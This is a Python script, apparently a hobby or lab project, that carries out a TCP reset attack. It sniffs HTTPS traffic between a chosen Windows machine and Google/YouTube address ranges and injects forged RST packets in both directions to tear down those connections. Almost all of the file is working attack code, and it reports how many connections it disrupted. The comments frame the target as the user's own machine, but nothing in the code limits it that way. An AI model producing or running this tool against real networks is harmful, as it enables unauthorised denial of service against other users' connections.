#!/usr/bin/env python3
"""
Windows YouTube TCP Reset Attack
Targets Windows machine YouTube traffic from WSL2
"""

import sys
import time
import threading
import subprocess
from scapy.all import *
from src.config_manager import ConfigManager
from src.logger import Logger
from src.network_utils import NetworkUtils
from src.packet_monitor import PacketMonitor

class WindowsYouTubeAttack:
    def __init__(self):
        self.config = ConfigManager()
        self.logger = Logger()
        self.network_utils = NetworkUtils()
        
        # Windows machine configuration
        self.windows_ip = "10.18.34.106"  # Your Windows IP
        self.windows_gateway = "10.18.34.1"  # Your Windows gateway
        self.wsl_ip = "172.31.126.113"      # WSL2 IP
        self.wsl_gateway = "172.31.112.1"   # WSL2 gateway
        
        # YouTube server IPs we've seen
        self.youtube_ips = {
            "142.251.43.174",
            "142.250.194.42", 
            "142.250.182.174",
            "172.217.26.3",
            "142.251.85.105"
        }
        
        self.attack_active = False
        self.packets_captured = 0
        self.youtube_packets = 0
        self.rst_injected = 0
        self.connections_attacked = set()
        
    def check_windows_connectivity(self):
        """Check if we can reach the Windows machine"""
        print(f"[CHECK] Testing connectivity to Windows machine {self.windows_ip}...")
        
        # Ping Windows machine
        result = subprocess.run(['ping', '-c', '3', self.windows_ip], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            print(f"✅ Windows machine {self.windows_ip} is reachable")
            return True
        else:
            print(f"❌ Cannot reach Windows machine {self.windows_ip}")
            return False
    
    def discover_youtube_traffic(self):
        """Monitor for YouTube traffic from Windows machine"""
        print(f"[DISCOVER] Monitoring traffic from Windows machine...")
        
        def packet_handler(packet):
            if IP in packet:
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                # Check if this is traffic from Windows machine
                if src_ip == self.windows_ip and TCP in packet:
                    dst_port = packet[TCP].dport
                    if dst_port == 443:  # HTTPS traffic
                        # Check if destination is YouTube
                        if self.is_youtube_server(dst_ip):
                            print(f"[YOUTUBE] {src_ip}:{packet[TCP].sport} -> {dst_ip}:{dst_port}")
                            self.youtube_ips.add(dst_ip)
        
        print(f"[DISCOVER] Sniffing for 10 seconds to find YouTube traffic...")
        sniff(filter=f"host {self.windows_ip}", prn=packet_handler, timeout=10)
        
        print(f"[DISCOVER] Found {len(self.youtube_ips)} YouTube server IPs:")
        for ip in self.youtube_ips:
            print(f"  - {ip}")
    
    def is_youtube_server(self, ip):
        """Check if IP belongs to YouTube/Google"""
        youtube_ranges = [
            "142.250.",  # Google
            "142.251.",  # Google
            "172.217.",  # Google
            "216.58.",   # Google
            "74.125.",   # Google
            "173.194.",  # Google
        ]
        
        return any(ip.startswith(prefix) for prefix in youtube_ranges) or ip in self.youtube_ips
    
    def create_rst_packet(self, original_packet):
        """Create TCP RST packet to disrupt connection"""
        if not (IP in original_packet and TCP in original_packet):
            return None
            
        ip_layer = original_packet[IP]
        tcp_layer = original_packet[TCP]
        
        # Create RST packet
        rst_packet = IP(
            src=ip_layer.dst,
            dst=ip_layer.src
        ) / TCP(
            sport=tcp_layer.dport,
            dport=tcp_layer.sport,
            seq=tcp_layer.ack,
            ack=tcp_layer.seq + len(original_packet[TCP].payload),
            flags="R"
        )
        
        return rst_packet
    
    def inject_rst_packet(self, packet):
        """Inject RST packet to disrupt connection"""
        try:
            if IP in packet and TCP in packet:
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                
                # Only attack traffic from Windows machine to YouTube
                if src_ip == self.windows_ip and self.is_youtube_server(dst_ip):
                    connection_id = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
                    
                    # Create and send RST packet
                    rst_packet = self.create_rst_packet(packet)
                    if rst_packet:
                        send(rst_packet, verbose=0)
                        self.rst_injected += 1
                        self.connections_attacked.add(connection_id)
                        
                        print(f"[RST] Injected RST for {connection_id}")
                        
                        # Also send RST in reverse direction
                        reverse_rst = IP(
                            src=dst_ip,
                            dst=src_ip
                        ) / TCP(
                            sport=dst_port,
                            dport=src_port,
                            seq=packet[TCP].ack,
                            ack=packet[TCP].seq,
                            flags="R"
                        )
                        send(reverse_rst, verbose=0)
                        self.rst_injected += 1
                        
                        print(f"[RST] Reverse RST sent to Windows machine")
                        
        except Exception as e:
            print(f"[ERROR] Failed to inject RST: {e}")
    
    def packet_monitor(self, packet):
        """Monitor and attack packets"""
        self.packets_captured += 1
        
        if IP in packet and TCP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            # Check for YouTube traffic from Windows machine
            if ((src_ip == self.windows_ip and self.is_youtube_server(dst_ip)) or
                (dst_ip == self.windows_ip and self.is_youtube_server(src_ip))):
                
                self.youtube_packets += 1
                
                # Log the traffic
                if TCP in packet:
                    src_port = packet[TCP].sport
                    dst_port = packet[TCP].dport
                    seq = packet[TCP].seq
                    ack = packet[TCP].ack
                    flags = packet[TCP].flags
                    
                    print(f"[MONITOR] YouTube: {src_ip}:{src_port} -> {dst_ip}:{dst_port} "
                          f"(seq={seq}, ack={ack}, flags={flags})")
                
                # Inject RST packet
                self.inject_rst_packet(packet)
    
    def start_attack(self):
        """Start the TCP Reset attack"""
        print("="*60)
        print("WINDOWS YOUTUBE TCP RESET ATTACK")
        print("="*60)
        print(f"Target: Windows machine {self.windows_ip}")
        print(f"Attack source: WSL2 {self.wsl_ip}")
        print(f"YouTube servers: {len(self.youtube_ips)} known IPs")
        print("="*60)
        
        # Check connectivity
        if not self.check_windows_connectivity():
            print("❌ Cannot reach Windows machine. Attack aborted.")
            return
        
        # Discover current YouTube traffic
        self.discover_youtube_traffic()
        
        print("\n" + "="*50)
        print("🎯 STARTING ATTACK ON WINDOWS YOUTUBE TRAFFIC")
        print("="*50)
        print(f"Monitoring traffic involving: {self.windows_ip}")
        print("Now start watching YouTube videos on your Windows machine!")
        print("Press Ctrl+C to stop the attack")
        print("="*50)
        
        self.attack_active = True
        
        try:
            # Start packet capture with filter for Windows machine
            filter_expr = f"host {self.windows_ip} and tcp"
            print(f"[MONITOR] Starting packet capture with filter: {filter_expr}")
            
            sniff(filter=filter_expr, prn=self.packet_monitor, store=0)
            
        except KeyboardInterrupt:
            print("\n[ATTACK] Attack stopped by user")
            self.attack_active = False
        
        # Print final statistics
        self.print_results()
    
    def print_results(self):
        """Print attack results"""
        print("\n" + "="*50)
        print("ATTACK RESULTS")
        print("="*50)
        print(f"Total packets captured: {self.packets_captured}")
        print(f"YouTube packets detected: {self.youtube_packets}")
        print(f"RST packets injected: {self.rst_injected}")
        print(f"Connections attacked: {len(self.connections_attacked)}")
        print(f"YouTube servers targeted: {len(self.youtube_ips)}")
        
        if self.connections_attacked:
            print("\nAttacked connections:")
            for conn in self.connections_attacked:
                print(f"  - {conn}")
        
        if self.rst_injected > 0:
            print(f"\n✅ ATTACK SUCCESSFUL!")
            print(f"Successfully disrupted {self.rst_injected} packets")
            print(f"Windows YouTube traffic was attacked!")
        else:
            print(f"\n❌ No YouTube traffic detected from Windows machine")
            print(f"Make sure you're watching YouTube videos on {self.windows_ip}")

def main():
    if os.geteuid() != 0:
        print("❌ This script requires root privileges (sudo)")
        print("Run: sudo python3 windows_youtube_attack.py")
        sys.exit(1)
    
    attack = WindowsYouTubeAttack()
    attack.start_attack()

if __name__ == "__main__":
    main()
